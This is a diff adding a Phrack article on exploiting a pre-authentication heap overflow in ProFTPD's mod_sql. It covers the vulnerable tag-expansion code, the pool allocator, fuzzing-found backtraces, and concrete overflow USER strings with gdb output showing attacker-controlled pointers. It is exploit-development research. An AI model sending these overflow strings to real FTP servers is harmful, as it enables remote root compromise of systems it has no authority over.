@@ -1,0 +1,2094 @@
+                              ==Phrack Inc.==
+
+                Volume 0x0e, Issue 0x43, Phile #0x07 of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=------=[ ProFTPD with mod_sql pre-authentication, remote root  ]=------=|
+|=-------------------------=[ heap overflow ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+|=-------------------=[ max_packetz@felinemenace.org ]=------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Contents
+
+  1 - Introduction 
+
+  2 - The vulnerability
+   2.1 - Tags explained
+   2.2 - Generating overflow strings
+
+  3 - Exploring what we can control
+   3.1 - Automating tasks
+   3.2 - ProFTPD Pool allocator
+   3.3 - Examining backtraces
+    3.3.1 - 11380f2c8ce44d29b93b9bc6308692ae backtrace
+    3.3.2 - 2813d637d735be610a460a75db061f6b backtrace
+    3.3.3 - 3d10e2a054d8124ab4de5b588c592830 backtrace
+    3.3.4 - 844319188798d7742af43d10f6541a61 backtrace 
+    3.3.5 - 914b175392625fe75c2b16dc18bfb250 backtrace
+    3.3.6 - b975726b4537662f3f5ddf377ea26c20 backtrace
+    3.3.7 - ccbbd918ad0dbc7a869184dc2eb9cc50 backtrace
+    3.3.8 - f1bfd5428c97b9d68a4beb6fb8286b70 backtrace
+    3.3.9 - Summary
+   3.4 - Exploitation avenues
+    3.4.1 - Shellcode approach
+    3.4.2 - Data manipulation
+
+  4 - Writing an exploit
+   4.1 - Exploitation via arbitrary pointer return
+   4.2 - Cleanup structure crash
+   4.3 - Potential enhancements
+   4.4 - Last thoughts
+
+  5 - Discussion of hardening techniques against exploitation
+   5.1 - Address Space Layout Randomisation
+   5.2 - Non-executable Memory
+   5.3 - Position Independent Binaries
+   5.4 - Stack Protector
+   5.5 - RelRO
+
+  6 - References
+
+--[ 1 - Introduction 
+
+This paper describes and explores a pre-authentication remote root heap
+overflow in the ProFTPD [1] FTP server. It's not quite a standard overflow,
+due to the how the ProFTPD heap works, and how the bug is exploited via 
+variable substition.
+
+The vulnerability was inadvertently mitigated (from remote root, at least 
+:( ) when the ProFTPD developers fixed a separate vulnerability in mod_sql 
+where you could inject SQL and bypass authentication. That vulnerability 
+that mitigated it is documented in CVE-2009-0542. 
+
+The specific vulnerability we are exploring is an unbounded copy operation 
+in sql_prepare_where(), which has not been fixed yet.
+
+Also, I'd like to preemptively apologise for the attached code. It evolved 
+over time in piecemeal fashion, and isn't overly pretty/readable by now :p
+
+--[ 2 - The vulnerability
+
+The vulnerability itself is a little contrived, but bare with me:
+
+In contrib/mod_sql.c, _sql_getpasswd(), we have the following code (line 
+numbers from ProFTPD 1.3.2rc2):
+
+---
+1132   if (!cmap.usercustom) {
+1133     where = sql_prepare_where(0, cmd, 2, usrwhere, cmap.userwhere, 
+                                   NULL);
+1134
+1135     mr = _sql_dispatch(_sql_make_cmd(cmd->tmp_pool, 5, "default",
+1136       cmap.usrtable, cmap.usrfields, where, "1"), "sql_select");
+1137
+---
+
+Where usrwhere is in the form of:
+
+(<table name for user column> = 'USERNAME')
+
+Inside of sql_prepare_where() is where all the fun takes place:
+
+---
+770 static char *sql_prepare_where(int flags, cmd_rec *cmd, int cnt, ...) {
+771   int i, flag, nclauses = 0;
+772   int curr_avail;
+773   char *buf = "", *res;
+774   va_list dummy;
+775
+776   res = pcalloc(cmd->tmp_pool, SQL_MAX_STMT_LEN);                   [1]
+777
+778   flag = 0;
+779   va_start(dummy, cnt);
+780   for (i = 0; i < cnt; i++) {
+781     char *clause = va_arg(dummy, char *);
+782     if (clause != NULL &&
+783         *clause != '\0') {
+784       nclauses++;
+785
+786       if (flag++)
+787         buf = pstrcat(cmd->tmp_pool, buf, " AND ", NULL);
+788       buf = pstrcat(cmd->tmp_pool, buf, "(", clause, ")", NULL);
+789     }
+790   }
+791   va_end(dummy);
+792
+793   if (nclauses == 0)
+794     return NULL;
+795
+796   if (!(flags & SQL_PREPARE_WHERE_FL_NO_TAGS)) {                    [2]
+797     char *curr, *tmp;
+798
+799     /* Process variables in WHERE clauses, except any "%{num}" 
+    references. */
+800     curr = res;
+801     curr_avail = SQL_MAX_STMT_LEN;
+802
+803     for (tmp = buf; *tmp; ) {
+804       char *str;
+805       modret_t *mr;
+806
+807       if (*tmp == '%') {
+808         char *tag = NULL;
+809
+810         if (*(++tmp) == '{') {
+811           char *query;
+812
+813           if (*tmp != '\0')
+814             query = ++tmp;
+815
+816           while (*tmp && *tmp != '}')
+817             tmp++;
+818
+819           tag = pstrndup(cmd->tmp_pool, query, (tmp - query));        
+820           if (tag) {
+821             str = resolve_long_tag(cmd, tag);                       [3]
+822             if (!str)
+823               str = pstrdup(cmd->tmp_pool, "");
+824
+825             mr = _sql_dispatch(_sql_make_cmd(cmd->tmp_pool, 2, 
+           "default",
+826               str), "sql_escapestring");
+827             if (check_response(mr) < 0)
+828               return NULL;
+829
+830             sstrcat(curr, mr->data, curr_avail);
+831             curr += strlen(mr->data);
+832             curr_avail -= strlen(mr->data);
+833
+834             if (*tmp != '\0')
+835               tmp++;
+836
+837           } else {
+838             return NULL;
+839           }
+840
+841         } else {
+842           str = resolve_short_tag(cmd, *tmp);                       [4]
+843           mr = _sql_dispatch(_sql_make_cmd(cmd->tmp_pool, 2,"default",
+844             str), "sql_escapestring");
+845           if (check_response(mr) < 0)
+846             return NULL;
+847
+848           sstrcat(curr, mr->data, curr_avail);
+849           curr += strlen(mr->data);
+850           curr_avail -= strlen(mr->data);
+851
+852           if (*tmp != '\0')
+853             tmp++;
+854         }
+855
+856       } else {                                                      [5]
+857         *curr++ = *tmp++;
+858         curr_avail--;
+859       }
+860     }
+861     *curr++ = '\0';
+862
+863   } else {
+864     res = buf;
+865   }
+866
+867   return res;
+868 }
+869
+---
+
+At [1], memory is allocated. SQL_MAX_STMT_LEN is defined as 4096 bytes. 
+That should be plenty for <300 bytes, right?
+
+At [2], flags are checked to see if "tags" should be expanded. In the case 
+we are interested in, tags are expanded.
+
+At [3], we see that "long tags" are expandable, and that they are 
+surrounded by %{ and finished with }. We'll ignore them for now. They take 
+up too much input space in regards to the output length.
+
+At [4], we see that they have concepts of "short" tags, consisting of one 
+byte.
+
+At [5], we see that they have an unbounded one byte copy operation, inside 
+of a suitable loop.
+
+Now, we need to cover tags to see what we can do with it:
+
+------[ 2.1 Tags explained
+
+For the path we're interested in, we'll cover "short" tags (longer tags are
+not all interesting, and for reasons explained later on).
+
+Looking at resolve_short_tag(), we see the following (heavily snipped for 
+brevity):
+
+---
+1719 static char *resolve_short_tag(cmd_rec *cmd, char tag) {
+1720   char arg[256] = {'\0'}, *argp;
+1721
+1722   switch (tag) {
+1723   case 'A': {
+1724       char *pass;
+1725
+1726       argp = arg;
+1727       pass = get_param_ptr(main_server->conf, C_PASS, FALSE);
+1728       if (!pass)
+1729         pass = "UNKNOWN";
+1730
+1731       sstrncpy(argp, pass, sizeof(arg));
+1732     }
+1733     break;
+1734
+1735   case 'a':
+1736     argp = arg;
+1737     sstrncpy(argp, 
+           pr_netaddr_get_ipstr(pr_netaddr_get_sess_remote_addr()),
+1738       sizeof(arg));
+1739     break;
+1740
+...
+1914   case 'm':
+1915     argp = arg;
+1916     sstrncpy(argp, cmd->argv[0], sizeof(arg));
+1917     break;
+1918
+...
+1929   case 'r':
+1930     argp = arg;
+1931     if (strcmp(cmd->argv[0], C_PASS) == 0 &&
+1932         session.hide_password)
+1933       sstrncpy(argp, C_PASS " (hidden)", sizeof(arg));
+1934
+1935     else
+1936       sstrncpy(argp, get_full_cmd(cmd), sizeof(arg));
+1937     break;
+1938
+...
+1954   case 'T':
+1955     argp = arg;
+1956     if (session.xfer.p) {
+...
+1974     } else
+1975       sstrncpy(argp, "0.0", sizeof(arg));
+1976
+1977     break;
+...
+2021
+2022   default:
+2023     argp = "{UNKNOWN TAG}";
+2024     break;
+2025   }
+2026
+2027   return pstrdup(cmd->tmp_pool, argp);
+2028 }
+2029
+---
+
+So, as you can see, tags are a form of variable substitution. %m and %r 
+allow us to "duplicate" our input, %a allows us to copy our IP address, %T 
+gives us 0.0 (since we're not transferring anything at the moment, and %Z 
+(handled by the default case) gives us "{UNKNOWN TAG}".
+
+By combining these, we can generate strings that expand past the allocated 
+size in sql_prepare_where, due to the unbounded copy.
+
+Firstly, we'll look at what those inputs would generate, then we'll look at
+how to generate suitable overflow strings.
+
+Firstly, the string "AAA%m" once processed would come out looking like:
+
+AAAAAA%m
+
+The string "AAA%m%m" would look like:
+
+AAAAAA%mAAA%m
+
+Unfortunately the string to be expanded isn't as clean as that, it's:
+
+(<name of user entry in table> = 'USER INPUT')\x00
+
+The default of the table field is "userid". Due to the ')\x00 at the end, 
+we can't do arbitrary off-by-1 or 2 overwrites. It's possible that \x00 or
+\x29 could be useful, in some situations however.
+
+Enough chars / %m's etc would expand past 4096 bytes, and start overwriting
+other information stored on the heap. Tags enable exploitation of this 
+issue via it's input duplication. They also have a significant effect on 
+the heap, for better or worse.
+
+(As a side note, contrib/mod_rewrite.c has %m tag support as well. Since it
+seems a little unlikely to hit that pre-auth, it wasn't investigated 
+further..)
+
+------[ 2.2 Generating overflow strings
+
+One initial complication we had in exploring this vulnerability further was
+due to making an overflow string that once processed would expand to a 
+suitable size. (As an example, overflow our own arbitrary content 32 bytes 
+past 4096).
+
+We solved this problem with using a constraint solver to generate the 
+appropriate strings for us, thus solving an otherwise annoying situation 
+(it being a little messy to calculate how much we need, since touching one 
+thing can dramatically throw off the rest of the calculations, as an 
+example, removing one A character would reduce it by one + 
+(one * amount_of_%m_tags)).
+
+In exploring the vulnerability, we used python-constraint [2].
+
+We used several constraints:
+
+  - Input string must be less than 256 bytes.
+  - The parsed string must overflow by exactly X+2 (due to ') added to
+    the end bytes.
+  - One/two others that I've forgotten about as I write this up.
+
+We split the strings into "fakeauth" strings, and "trigger" strings. The
+fakeauth strings are designed to consume/allocate a certain amount of 
+memory, and the trigger strings are designed to overwrite a bunch of bytes 
+after the allocation.
+
+Fakeauth strings seem to be required for maximum control of the remote 
+process, but it's possible it's not required at all.
+
+By mixing the %m's / %a's / %Z's up, it is possible to change memory 
+allocation / deallocation order, and thus explore/affect where it crashes.
+
+While the %a tags are useful in experimenting, they are not ideal, as you 
+then need to take your local IP address into account when exploiting remote
+hosts. 
+
+--[ 3 - Exploring what we can control
+
+------[ 3.1 - Automating tasks
+
+I'm a big fan of automating as much stuff as possible. In order to get a 
+ten thousand foot view of what I can do, I used python-ptrace [3] and
+pyevolve [4] to:
+
+  - Generate input strings
+  - Debug proftpd and record before/after overwriting the memory allocated 
+    in sql_prepare_where
+  - Analyze how "interesting" the results of input strings where.
+    - Process exited? Completely uninteresting. 
+    - SEGV'd? 
+      - Gather backtraces / register contents / see if the program crashed 
+        with our directly controllable user input / etc.
+
+Pyevolve, for the most part, was useful for mutating the input strings to 
+explore the code paths leading to crashes..
+
+By doing these tasks, I was able to find the more interesting paths that 
+could easily be hit, while I was flicking over the ProFTPD pool allocator
+... 
+
+------[ 3.2 - ProFTPD Pool allocator
+
+A high level overview for the ProFTPD pool allocator (src/pool.c) is given 
+at [5], but here are the quick nuts and bolts of it:
+
+- Pools are allocated, and is subdivided into blocks.
+
+- Pools have cleanup handlers (very useful - used in proftpd-not-pro-enough
+  [6] exploit by solar to gain code execution).
+
+- More blocks are malloc()'d if the pool is out of space.
+
+- Memory is never free()'d unless developer mode is enabled, and that's
+  only at daemon shut down. 
+
+- In order to allocate memory, the single linked list of free blocks is
+  checked to see if the allocation request can be satisfied first without 
+  calling malloc().
+
+The pool structure is defined as:
+
+---
+196 struct pool {
+197   union block_hdr *first;
+198   union block_hdr *last;
+199   struct cleanup *cleanups;
+200   struct pool *sub_pools;
+201   struct pool *sub_next;
+202   struct pool *sub_prev;
+203   struct pool *parent;
+204   char *free_first_avail;
+205   const char *tag;
+206 };
+---
+
+The cleanup structure looks like:
+
+---
+655 typedef struct cleanup {
+656   void *data;
+657   void (*plain_cleanup_cb)(void *);
+658   void (*child_cleanup_cb)(void *);
+659   struct cleanup *next;
+660 } cleanup_t;
+---
+
+Overwriting a cleanup structure, or a pool structure, would allow us to
+arbitrarily execute code when the pool is cleared/destroyed.
+
+The block structure is defined as:
+
+---
+46 union block_hdr {
+47   union align a;
+48
+49   /* Padding */
+50 #if defined(_LP64) || defined(__LP64__)
+51   char pad[32];
+52 #endif
+53
+54   /* Actual header */
+55   struct {
+56     char *endp;
+57     union block_hdr *next;
+58     char *first_avail;
+59   } h;
+60 };
+---
+
+Now, we trace pcalloc() as it's called in sql_prepare_where() (and
+numerously throughout the ProFTPD code), just to see what situations will 
+allow us to return pointers that we control. Controlling these returned 
+pointers would allow us to overwrite arbitrary memory, hopefully with 
+content that we can control.
+
+---
+481 void *pcalloc(struct pool *p, int sz) {
+482   void *res = palloc(p, sz);
+483   memset(res, '\0', sz);
+484   return res;
+485 }
+---
+
+gives us:
+
+---
+473 void *palloc(struct pool *p, int sz) {
+474   return alloc_pool(p, sz, FALSE);
+475 }
+---
+
+which in turn gives us:
+
+---
+435 static void *alloc_pool(struct pool *p, int reqsz, int exact) {
+436
+437   /* Round up requested size to an even number of aligned units */
+438   int nclicks = 1 + ((reqsz - 1) / CLICK_SZ);
+439   int sz = nclicks * CLICK_SZ;
+440
+441   /* For performance, see if space is available in the most recently
+442    * allocated block.
+443    */
+444
+445   union block_hdr *blok = p->last;
+446   char *first_avail = blok->h.first_avail;
+447   char *new_first_avail;
+448
+449   if (reqsz <= 0)
+450     return NULL;
+451
+452   new_first_avail = first_avail + sz;
+453
+454   if (new_first_avail <= blok->h.endp) {                        [1]
+455     blok->h.first_avail = new_first_avail;
+456     return (void *) first_avail;
+457   }
+458
+459   /* Need a new one that's big enough */
+460   pr_alarms_block();
+461
+462   blok = new_block(sz, exact);                                  [2]
+463   p->last->h.next = blok;
+464   p->last = blok;
+465
+466   first_avail = blok->h.first_avail;                            [3]
+467   blok->h.first_avail += sz;
+468
+469   pr_alarms_unblock();
+470   return (void *) first_avail;
+471 }
+---
+
+The check at [1] checks to see if the request can be satisfied from the 
+pool allocation itself..
+
+The call at [2] requests a "new_block" of memory. The returned pointer is 
+determined at [3], indicating that the first_avail pointer at least needs 
+to be modified.
+
+---
+151 /* Get a new block, from the free list if possible, otherwise malloc a 
+       new
+152  * one.  minsz is the requested size of the block to be allocated.
+153  * If exact is TRUE, then minsz is the exact size of the allocated 
+       block;
+154  * otherwise, the allocated size will be rounded up from minsz to the 
+       nearest
+155  * multiple of BLOCK_MINFREE.
+156  *
+157  * Important: BLOCK ALARMS BEFORE CALLING
+158  */
+159
+160 static union block_hdr *new_block(int minsz, int exact) {
+161   union block_hdr **lastptr = &block_freelist;
+162   union block_hdr *blok = block_freelist;
+163
+164   if (!exact) {
+165     minsz = 1 + ((minsz - 1) / BLOCK_MINFREE);
+166     minsz *= BLOCK_MINFREE;
+167   }
+168
+169   /* Check if we have anything of the requested size on our free list 
+         first...
+170    */
+171   while (blok) {
+172     if (minsz <= blok->h.endp - blok->h.first_avail) {
+173       *lastptr = blok->h.next;
+174       blok->h.next = NULL;
+175
+176       stat_freehit++;
+177       return blok;
+178
+179     } else {
+180       lastptr = &blok->h.next;
+181       blok = blok->h.next;
+182     }
+183   }
+184
+185   /* Nope...damn.  Have to malloc() a new one. */
+186   stat_malloc++;
+187   return malloc_block(minsz);
+188 }
+---
+
+BLOCK_MINFREE is defined to PR_TUNABLE_NEW_POOL_SIZE, which is defined to 
+512 bytes. 
+
+So, we can see that if we can get the stars to align correctly, we can gain
+code execution via:
+
+  - Pool cleanup/destruction
+  - Corrupting the first_avail pointer in a block.
+
+The second method is a little more effort, but it may not be possible to 
+hit the first.
+
+There are other avenues potentially available such as unlink() style
+corruption, or other heap content overwrites, but they were not explored in
+depth. 
+
+------[ 3.3 - Examining backtraces
+
+After leaving the proftpd input fuzzing / automated crash analysis code [7] 
+running for a while, I decided to stop it and examine some of the 
+backtraces it created, in order to see what was found, and if any indicated
+that they where able to gain direct code execution, or useful memory 
+corruption.
+
+# echo backtraces: `ls -l backtrace.* | wc -l` ; echo unique backtraces:
+  `md5su m backtrace.* | awk '{ print $1 }' | sort | uniq`
+backtraces: 4280
+unique backtraces: 11380f2c8ce44d29b93b9bc6308692ae
+2813d637d735be610a460a75db061f6b 3d10e2a054d8124ab4de5b588c592830
+844319188798d7742af43d10f6541a61 914b175392625fe75c2b16dc18bfb250
+b975726b4537662f3f5ddf377ea26c20 ccbbd918ad0dbc7a869184dc2eb9cc50
+f1bfd5428c97b9d68a4beb6fb8286b70
+
+Some of these back traces are very similiar, only real change in where they
+are called from. However, seeing that the code can be reached from multiple
+places is good; as it gives us more chances to take control of the remote
+process.
+
+Flicking through the backtraces:
+
+--------[ 3.3.1 - 11380f2c8ce44d29b93b9bc6308692ae backtrace ]
+
+# cat bt_frames.99861.0
+EIP: 0xb7b7e67a, EBP: 0xbfd0a0a8, memset
+EIP: 0x08055034, EBP: 0xbfd0a0d8, pstrcat
+EIP: 0x080c0d85, EBP: 0xbfd0a118, cmd_select
+EIP: 0x080c26f2, EBP: 0xbfd0a148, _sql_dispatch
+EIP: 0x080c4354, EBP: 0xbfd0a1f8, _sql_getpasswd
+EIP: 0x080c514d, EBP: 0xbfd0a2d8, _sql_getgroups
+EIP: 0x080ca70e, EBP: 0xbfd0a308, cmd_getgroups
+EIP: 0x080718a6, EBP: 0xbfd0a328, call_module
+EIP: 0x0807339e, EBP: 0xbfd0a358, dispatch_auth
+EIP: 0x0807481d, EBP: 0xbfd0a408, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a438, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a478, pr_auth_get_anon_config
+EIP: 0x080a4b5c, EBP: 0xbfd0a4d8, auth_user
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804caba, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+
+# cat regs.99861.0
+EAX: 0x00000000
+EBX: 0x0882d654
+ECX: 0x0000103c
+EDX: 0x00000001
+ESI: 0x080d4960
+EDI: 0x41346141
+EBP: 0xbfd0a0a8
+ESP: 0xbfd0a078
+EIP: 0xb7b7e67a
+
+So far, we can see we are memset()'ing a controllable pointer :D
+
+Looking further at _sql_getpasswd in the backtrace:
+
+(gdb) l *0x080c4354
+0x80c4354 is in _sql_getpasswd (mod_sql.c:1252).
+1247      }
+1248
+1249      if (!cmap.usercustom) {
+1250        where = sql_prepare_where(0, cmd, 2, usrwhere, cmap.userwhere, 
+                                      NULL);
+1251
+1252        mr = _sql_dispatch(_sql_make_cmd(cmd->tmp_pool, 5, "default",
+1253          cmap.usrtable, cmap.usrfields, where, "1"), "sql_select");
+1254
+1255        if (check_response(mr) < 0)
+1256          return NULL;
+
+(gdb) l *0x080c0d85
+0x80c0d85 is in cmd_select (mod_sql_mysql.c:812).
+807       } else {
+808         query = pstrcat(cmd->tmp_pool, cmd->argv[2], " FROM ", 
+                            cmd->argv[1], NULL);
+809
+810         if (cmd->argc > 3 &&
+811             cmd->argv[3])
+812           query = pstrcat(cmd->tmp_pool, query, " WHERE ", 
+                              cmd->argv[3], NULL);
+813
+814         if (cmd->argc > 4 &&
+815             cmd->argv[4])
+816           query = pstrcat(cmd->tmp_pool, query, " LIMIT ", 
+                              cmd->argv[4], NULL);
+
+This backtrace is interesting, as it's appending contents we directly 
+control to the chunk. Playing further:
+
+# telnet 127.0.0.1 21
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+220 ProFTPD 1.3.1 Server (ProFTPD Default Installation) [127.0.0.1]
+USER A%m%m%mA%m%Z%Z%m%m%m%m%Z%mA%m%m%m%mA%m%m%m%m%m%m%m%mA%mA%m%Z%Z%mAA%m%m
+%ZA%m%m%m%ZA%m%m%m%Z%m%m%Z%m
+331 Password required for A%m%m%mA%m%Z%Z%m%m%m%m%Z%mA%m%m%m%mA%m%m%m%m%m%m%
+m%mA%mA%m%Z%Z%mAA%m%m%ZA%m%m%m%ZA%m%m%m%Z%m%m%Z%m
+USER AAAAAAAAAA%m%m%mA%m%m%mA%m%mAA%m%m%m%m%mA%m%Z%m%mA%m%mAA%mA%ZAA%m%m%m%
+m%m%mA%m%ZAAA%mAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
+Ac0A
+
+...
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread 0xb7c7a6b0 (LWP 19840)]
+0xb7cf467a in memset () from /lib/tls/i686/cmov/libc.so.6
+(gdb) bt
+#0  0xb7cf467a in memset () from /lib/tls/i686/cmov/libc.so.6
+#1  0x08054d1a in pcalloc (p=0x98a84c4, sz=4156) at pool.c:481
+#2  0x08055034 in pstrcat (p=0x98a84c4) at pool.c:580
+#3  0x080c0d85 in cmd_select (cmd=0x98a84ec) at mod_sql_mysql.c:812
+#4  0x080c26f2 in _sql_dispatch (cmd=0x98a84ec, cmdname=0x80e4a3d 
+    "sql_select") at mod_sql.c:393
+#5  0x080c4354 in _sql_getpasswd (cmd=0x98a1ad4, p=0xbfa8368c) at 
+    mod_sql.c:1252
+#6  0x080c514d in _sql_getgroups (cmd=0x98a1ad4) at mod_sql.c:1599
+#7  0x080ca70e in cmd_getgroups (cmd=0x98a1ad4) at mod_sql.c:3612
+#8  0x080718a6 in call_module (m=0x80ee940, func=0x80ca6bd <cmd_getgroups>,
+    cmd=0x98a1ad4) at modules.c:439
+#9  0x0807339e in dispatch_auth (cmd=0x98a1ad4, match=0x80d9685 
+    "getgroups", m=0x0) at auth.c:89
+#10 0x0807481d in pr_auth_getgroups (p=0x98a1a04,
+    name=0x9852eec "AAAAAAAAAA%m%m%mA%m%m%mA%m%mAA%m%m%m%m%mA%m%Z%m%mA%m%mA
+    A%mA%ZAA%m%m%m%m%m%mA%m%ZAAA%mAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab
+    3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A", group_ids=0x80fb0bc, group_names=0x80fb0c0) 
+    at auth.c:691
+#11 0x08074a98 in auth_anonymous_group (p=0x98a1a04,
+    user=0x9852eec "AAAAAAAAAA%m%m%mA%m%m%mA%m%mAA%m%m%m%m%mA%m%Z%m%mA%m%mA
+    A%mA%ZAA%m%m%m%m%m%mA%m%ZAAA%mAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab
+    3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A") at auth.c:751
+#12 0x08074ea7 in pr_auth_get_anon_config (p=0x98a1a04, 
+    login_name=0xbfa838f8, user_name=0x0, anon_name=0x0) at auth.c:864
+#13 0x080a4b5c in auth_user (cmd=0x9852e94) at mod_auth.c:1831
+#14 0x080718a6 in call_module (m=0x80ec9e0, func=0x80a4a10 <auth_user>, 
+    cmd=0x9852e94) at modules.c:439
+#15 0x0804c651 in _dispatch (cmd=0x9852e94, cmd_type=2, validate=1, 
+    match=0x9852ee4 "USER") at main.c:424
+#16 0x0804caba in pr_cmd_dispatch (cmd=0x9852e94) at main.c:523
+#17 0x0804d4ee in cmd_loop (server=0x9853af4, c=0x988abdc) at main.c:750
+#18 0x0804ea36 in fork_server (fd=1, l=0x988a7bc, nofork=0 '\0') at 
+    main.c:1257
+#19 0x0804f1cf in daemon_loop () at main.c:1464
+#20 0x080522c6 in standalone_main () at main.c:2294
+#21 0x08053109 in main (argc=4, argv=0xbfa84374, envp=0xbfa84388) at 
+    main.c:2878
+(gdb) i r
+eax            0x0      0
+ecx            0x103c   4156
+edx            0x1      1
+ebx            0x98a2444        160048196
+esp            0xbfa834a8       0xbfa834a8
+ebp            0xbfa834d8       0xbfa834d8
+esi            0x80d4960        135088480
+edi            0x41346141       1093951809
+...
+# ruby pattern_offset.rb 0x41346141
+12
+...
+(gdb) frame 2
+#2  0x08055034 in pstrcat (p=0x98a84c4) at pool.c:580
+580       res = (char *) pcalloc(p, len + 1);
+(gdb) info locals
+argp = 0x0
+res = 0x0
+len = 4155
+dummy = 0xbfa83524 ...
+(gdb) x/32x $esp
+0xbfa834e0:     0x098a84c4      0x0000103c      0x00000000      0x00000000
+0xbfa834f0:     0x00000000      0x0988b62c      0xbfa83524      0x0000103b
+0xbfa83500:     0x00000000      0x00000000      0xbfa83548      0x080c0d85
+0xbfa83510:     0x098a84c4      0x098a854c      0x080e40e5      0x098aa7d4
+0xbfa83520:     0x00000000      0x080ef060      0x00000000      0x00000000
+0xbfa83530:     0x00000000      0x098a854c      0x00000000      0x098a8534
+0xbfa83540:     0x0988b62c      0x0988b68c      0xbfa83578      0x080c26f2
+0xbfa83550:     0x098a84ec      0x080e441a      0x098aa7d4      0x098a3874
+(gdb) x/s  0x098a854c
+0x98a854c:       "userid, passwd, uid, gid, homedir, shell FROM ftpuser"
+(gdb) x/s  0x080e40e5
+0x80e40e5:       " WHERE "
+(gdb) x/s  0x098aa7d4
+0x98aa7d4:       "(userid='", 'A' <repeats 20 times>, "%m%m%mA%m%m%mA%m%mAA
+%m%m%m%m%mA%m%Z%m%mA%m%mAA%mA%ZAA%m%m%m%m%m%mA%m%ZAAA%mAa0Aa1Aa2Aa3Aa4Aa5Aa
+6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0", 'A' <repeats 11 times>, 
+"%m%m%mA%m%m%mA%m%mAA%m"...
+
+This crash is excellent, but it has several drawbacks:
+  - No direct control of EIP, thus requiring overwriting larger chunks of 
+    memory which may be problematic.
+  - Configuration dependent :(
+    - Both SQLUserInfo and SQLGroupInfo specify table names and table 
+      entries. For example:
+      - SQLUserInfo ftpuser userid passwd uid gid homedir shell
+      - SQLGroupInfo ftpgroup groupname gid members
+    - We could collect common configurations recommended in guides so that 
+      we can take them into account when bruteforcing.. sucky though.
+
+Let's see what the others contain before getting too excited :)
+
+------[ 3.3.2 - 2813d637d735be610a460a75db061f6b backtrace ]
+
+# cat bt_frames.16259.0
+EIP: 0x08054b7d, EBP: 0xbfd0a1d8, destroy_pool
+EIP: 0x08054b0c, EBP: 0xbfd0a1e8, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a1f8, destroy_pool
+EIP: 0x0807389f, EBP: 0xbfd0a248, pr_auth_getpwnam
+EIP: 0x080a0e3a, EBP: 0xbfd0a488, setup_env
+EIP: 0x080a51ca, EBP: 0xbfd0a4d8, auth_pass
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
+EIP: 0x0804c651, EBP: 0xbfd0a5a8, _dispatch
+EIP: 0x0804caba, EBP: 0xbfd0a5d8, pr_cmd_dispatch
+EIP: 0x0804d4ee, EBP: 0xbfd0aa48, cmd_loop
+EIP: 0x0804ea36, EBP: 0xbfd0ab88, fork_server
+EIP: 0x0804f1cf, EBP: 0xbfd0acf8, daemon_loop
+EIP: 0x080522c6, EBP: 0xbfd0ad28, standalone_main
+EIP: 0x08053109, EBP: 0xbfd0aea8, main
+EIP: 0xb7b1c685, EBP: 0xbfd0af18, __libc_start_main
+EIP: 0x0804b841, EBP: 0x00000000, _start
+# cat regs.16259.0
+EAX: 0x62413362
+EBX: 0x0000b25d
+ECX: 0x00000002
+EDX: 0x0882f8e8
+ESI: 0x080d4960
+EDI: 0x088161e8
+EBP: 0xbfd0a1d8
+ESP: 0xbfd0a1d0
+EIP: 0x08054b7d
+
+EAX looks like a modified pointer, and we can see we're in the
+destroy_pool / clean_pool code. No arbitrary EIP yet :~(
+
+(gdb) l *0x08054b7d
+0x8054b7d is in destroy_pool (pool.c:415).
+410         return;
+411
+412       pr_alarms_block();
+413
+414       if (p->parent) {
+415         if (p->parent->sub_pools == p)
+416           p->parent->sub_pools = p->sub_next;
+417
+418         if (p->sub_prev)
+419           p->sub_prev->sub_next = p->sub_next;
+
+(gdb) l * 0x08054b0c
+0x8054b0c is in clear_pool (pool.c:395).
+390       /* Run through any cleanups. */
+391       run_cleanups(p->cleanups);
+392       p->cleanups = NULL;
+393
+394       /* Destroy subpools. */
+395       while (p->sub_pools)
+396         destroy_pool(p->sub_pools);
+397       p->sub_pools = NULL;
+398
+399       free_blocks(p->first->h.next);
+
+So, we can see that we've corrupted the p->parent->sub_pools pointer. Not 
+immediately interesting, as we've isolated what appears to be very 
+interesting earlier on. Might be able to do some fun and games at some 
+point with the old unlink() style, though.
+
+------[ 3.3.3 - 3d10e2a054d8124ab4de5b588c592830 backtrace ]
+
+# cat bt_frames.99758.0
+
+EIP: 0x08054b7d, EBP: 0xbfd0a338, destroy_pool
+EIP: 0x08054b0c, EBP: 0xbfd0a348, clear_pool
+EIP: 0x08054bd1, EBP: 0xbfd0a358, destroy_pool
+EIP: 0x08074a37, EBP: 0xbfd0a408, pr_auth_getgroups
+EIP: 0x08074a98, EBP: 0xbfd0a438, auth_anonymous_group
+EIP: 0x08074ea7, EBP: 0xbfd0a478, pr_auth_get_anon_config
+EIP: 0x080a4b5c, EBP: 0xbfd0a4d8, auth_user
+EIP: 0x080718a6, EBP: 0xbfd0a4f8, call_module
